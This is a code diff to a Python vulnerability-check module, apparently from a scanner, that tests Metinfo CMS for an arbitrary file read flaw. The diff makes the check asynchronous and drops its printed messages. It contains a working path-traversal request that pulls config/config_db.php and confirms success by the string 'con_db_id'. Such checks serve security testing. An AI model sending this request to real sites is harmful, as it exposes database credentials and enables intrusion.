@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.common import get_useragent
+from app.lib.request import request
 
 class Metinfo_Anyfile_Read_BaseVerify:
     def __init__(self, url):
@@ -19,7 +19,7 @@ class Metinfo_Anyfile_Read_BaseVerify:
             "User-Agent": get_useragent()
         }
 
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -31,18 +31,11 @@ class Metinfo_Anyfile_Read_BaseVerify:
         
         try:
             check_url = self.url + '/member/index.php?a=doshow&m=include&c=old_thumb&dir=http/./.../..././/./.../..././/config/config_db.php'
-            req = request.get(check_url, headers = self.headers)
-            if "con_db_id" in req.text  and req.status_code==200:
-                print('存在Metinfo任意文件读取漏洞')
+            req = await request.get(check_url, headers = self.headers)
+            if "con_db_id" in await req.text()  and req.status==200:
                 return True
-            else:
-                print('不存在Metinfo任意文件读取漏洞')
-                return False
         except Exception as e:
-            print(e)
-            print('不存在Metinfo任意文件读取')
-            return False
-        finally:
+            # print(e)
             pass
 
 if __name__ == '__main__':
